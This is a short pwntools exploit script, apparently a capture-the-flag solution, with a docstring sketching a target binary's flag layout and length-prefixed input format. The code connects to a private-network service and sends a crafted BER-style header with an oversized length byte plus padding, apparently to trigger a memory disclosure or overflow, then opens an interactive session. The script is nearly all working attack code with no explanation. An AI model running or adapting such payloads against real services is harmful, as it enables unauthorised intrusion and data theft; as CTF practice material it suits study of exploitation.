'''
flag_variable
0x0201062B | 0x00000501 | -- 12byte -- | 0x00000008 | 0x4 | flag_length | -- 8byte -- | flag_mem

input
0x48 | length | data
        |___-> length > 0x7f = 4byte length
model
head | body | foot
'''
from pwn import *

s = remote('192.168.50.4',1234)
raw_input('debug!')
s.send('\x30\x81')
s.send('\xff')
dat = ""
dat += "\x02\x01\x03"
s.send(dat+'A'*(0xff-len(dat)))
s.interactive()
